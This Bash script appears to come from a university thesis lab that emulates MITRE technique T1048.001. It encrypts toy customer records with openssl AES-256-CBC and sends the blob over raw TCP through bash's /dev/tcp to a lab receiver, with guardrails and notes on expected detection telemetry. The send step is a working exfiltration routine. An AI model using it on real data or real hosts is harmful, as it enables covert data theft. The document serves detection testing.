#!/usr/bin/env bash
# ============================================================================
# ATA019 · T1048.001 Symmetric Encrypted Non-C2 Protocol — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol
#           (tactica Exfiltration). ATA008 cubrio la variante ASIMETRICA
#           (T1048.002, openssl + wget); esta es la SIMETRICA.
# Fuente  : custom (escrito por el TFG)
# Objetivo: cifrar un fichero de datos simulados con clave SIMETRICA
#           (`openssl enc -aes-256-cbc`) y ENVIARLO por un protocolo alternativo
#           NO-HTTP: TCP crudo al receptor del HOST (`/dev/tcp`, puerto 9091).
# Destino : tcp://192.168.65.1:9091 (receptor del HOST, VMnet1)
# Ejecuta : desde /home/angel/lab-attack/ATA019 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST con `--tcp-port 9091` antes de t0 (ver README §9).
#    La prueba de que el dato SALIO es la linea `TCP ... sha256=` del `sink.log`
#    con el sha256 del blob CIFRADO (== sha256 del fichero .enc enviado).
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el destino DEBE ser 192.168.65.1:9091 (receptor del laboratorio);
#   - JAMAS se toca una ruta fuera del laboratorio; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de openssl (cifrado/descifrado) -> 80792 (deteccion; T1048.001-S1).
#   - execve de cat (envio del blob por TCP)   -> 80792 (deteccion; T1048.001-S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA019/*` (T1048.001-S3).
#
# Prueba de exito (INDEPENDIENTE de la alerta): `sink.log` del HOST con una linea
#   `TCP from=192.168.65.129 len=<N> sha256=<H>` donde <H> == sha256 del .enc.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA019"
PLAIN="${BASE}/extracto_clientes_2026.txt"
ENC="${BASE}/extracto_clientes_2026.txt.enc"
RTP="${BASE}/roundtrip_verificado.txt"
KEY="TFG-Lab-2026-toy-key"   # clave SIMETRICA de laboratorio (de juguete; no es un secreto real)
HOST="192.168.65.1"
TCP_PORT="9091"

echo "ATA019 · T1048.001 Symmetric Encrypted Non-C2 (openssl enc + TCP crudo) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in openssl cat sha256sum awk; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor TCP del laboratorio (VMnet1 del host).
if [ "$HOST" != "192.168.65.1" ] || [ "$TCP_PORT" != "9091" ]; then
  echo "ERROR: destino '$HOST:$TCP_PORT' fuera del receptor del laboratorio (abortado)" >&2
  exit 1
fi

# 0) SIEMBRA del dato a exfiltrar (datos de juguete: extracto de clientes; builtin
#    printf -> sin execve). Determinista e idempotente.
if [ ! -f "$PLAIN" ]; then
  {
    printf 'cliente,nif,segmento,facturacion_eur\n'
    printf 'Acme Iberica,B12345678,empresa,182340.50\n'
    printf 'Mallory Consulting SL,B87654321,empresa,91200.00\n'
    printf 'Logistica Norte SL,B11223344,empresa,45310.75\n'
  } > "$PLAIN"
fi

echo "--- FICHERO ORIGINAL (a cifrar) ---"
sha256sum "$PLAIN"

# 1) CIFRADO SIMETRICO (execve de openssl): AES-256-CBC con clave/passphrase simetrica.
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -pass "pass:${KEY}" -in "$PLAIN" -out "$ENC"

# 2) ENVIO por TCP CRUDO (protocolo alternativo NO-HTTP):
#    - descriptor 3 = socket TCP via el builtin /dev/tcp de bash (sin execve);
#    - `cat` (execve) vuelca el blob cifrado al socket;
#    - cerrar el descriptor -> FIN -> el receptor lee hasta EOF.
exec 3<>"/dev/tcp/${HOST}/${TCP_PORT}" || { echo "ERROR: no puedo abrir TCP a ${HOST}:${TCP_PORT}" >&2; exit 1; }
cat "$ENC" >&3
exec 3>&-

# 3) PRUEBA DE EFECTO (local): sha256 del blob CIFRADO realmente enviado.
s_enc=$(sha256sum "$ENC" | awk '{print $1}')

# 4) ROUND-TRIP SIMETRICO: descifrar y comprobar que recupera el original exacto
#    (demuestra que fue cifrado SIMETRICO, con la misma clave). execve de openssl.
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -pass "pass:${KEY}" -in "$ENC" -out "$RTP" 2>/dev/null
s_plain=$(sha256sum "$PLAIN" | awk '{print $1}')
s_rt=$(sha256sum "$RTP" | awk '{print $1}')

echo "--- estado final ---"
ls -l "$PLAIN" "$ENC" "$RTP"
echo "sha256 original       = $s_plain"
echo "sha256 enviado (cifr) = $s_enc"
echo "sha256 roundtrip      = $s_rt"
if [ -s "$ENC" ] && [ "$s_plain" = "$s_rt" ]; then
  echo "CIFRADO_SIMETRICO=OK (blob cifrado enviado por TCP; roundtrip identico al original)"
else
  echo "CIFRADO_SIMETRICO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
